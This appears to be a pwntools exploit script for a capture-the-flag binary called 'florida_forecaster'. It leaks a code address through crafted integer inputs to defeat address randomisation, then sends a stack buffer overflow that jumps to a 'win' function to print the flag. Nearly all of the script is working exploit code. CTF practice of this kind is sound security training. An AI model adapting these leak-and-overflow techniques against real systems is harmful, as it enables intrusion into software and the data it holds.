#!/usr/bin/python3
from pwn import *
import monkeyhex

context.log_level = 'debug'
context.terminal = ['termite', '-e']

#lib = ELF('/usr/lib/libc.so.6') if not args.REMOTE else ELF('')
binary = context.binary = ELF('florida_forecaster')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    """ if commands is None else commands
    return gdb.attach(p, val)


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    p = process(binary.path)
    if start_gdb is True:
        attach_gdb(p)
    return p

leaks = []
p = new_proc(False) if not args.REMOTE else remote('', int(''))
p.sendafter(b'Choice: ', b'3\n')
v1, v2 = 7689052569404, 3298534883324

p.sendafter(b'(integer): ', str(v1).encode() + b'\n')
p.sendafter(b'(integer): ', str(v2).encode() + b'\n')
leak = p.recvuntil(b'\n')

binary.sym['test_forecast'] = 0x001369
binary.sym['win'] = 0x0001289
test_forecast_addr = int(leak, 16)
log.info('test_forecast_addr %s', hex(test_forecast_addr))
binary.address = test_forecast_addr - binary.sym['test_forecast']

"""
# additional uneccessary libc leak
p.sendafter(b'Choice: ', b'3\n')
v1, v2 = 0x30030101e0c0c0c2, 0x4120094000000003
p.sendafter(b'(integer): ', str(v1).encode() + b'\n')
p.sendafter(b'(integer): ', str(v2).encode() + b'\n')
p.recvuntil(b'\n')

error_leak = p.recvuntil(b'\n').replace(b'A Florida man ', b'').strip()
error_leak = u64(error_leak.ljust(8, b'\x00'))
log.info('error leak %s', hex(error_leak))
"""

p.sendafter(b'Choice: ', b'2\n')

p.sendafter(b"Enter test data\n", b'\x41'*0x90 + p64(binary.sym['win']) + p64(1) + b'\n')
print(p.recvuntil(b'}'))
